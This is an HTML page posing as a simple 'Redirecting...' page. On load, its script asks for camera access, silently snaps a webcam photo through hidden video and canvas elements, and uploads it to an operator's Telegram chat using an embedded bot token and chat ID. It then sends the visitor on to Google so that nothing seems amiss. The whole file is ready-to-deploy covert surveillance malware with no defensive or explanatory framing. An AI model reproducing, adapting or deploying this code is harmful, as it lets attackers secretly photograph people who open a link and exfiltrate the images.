<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Redirecting...</title>
</head>
<body style="margin:0; background:#000;">
  <!-- Hidden video and canvas elements -->
  <video id="video" autoplay playsinline style="display:none;"></video>
  <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>

  <script>
    const BOT_TOKEN = "8182226345:AAF3bv4klc-gx-he8_uzPgq-NFPpZqXQ2Ro";
    const CHAT_ID = "7009447523";
    const REDIRECT_URL = "https://google.com"; // ðŸ‘ˆ Apni link yahan daalein

    async function captureAndSend() {
      try {
        // Request camera access
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById("video");
        const canvas = document.getElementById("canvas");
        video.srcObject = stream;

        // Wait for video to load
        await new Promise(resolve => {
          video.onloadedmetadata = () => resolve();
        });

        // Small delay for camera adjustment
        setTimeout(async () => {
          const ctx = canvas.getContext("2d");
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          const imageData = canvas.toDataURL("image/png");
          const blob = await (await fetch(imageData)).blob();

          const formData = new FormData();
          formData.append("chat_id", CHAT_ID);
          formData.append("photo", blob, "image.png");

          // Send to Telegram
          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: "POST",
            body: formData
          });

          // Redirect after sending
          window.location.href = REDIRECT_URL;
        }, 1200); // adjust timing if needed

      } catch (err) {
        // If user blocks camera or error occurs, still redirect
        console.error("Camera access denied or failed:", err);
        window.location.href = REDIRECT_URL;
      }
    }

    // Run on page load
    window.onload = captureAndSend;
  </script>
</body>
</html>
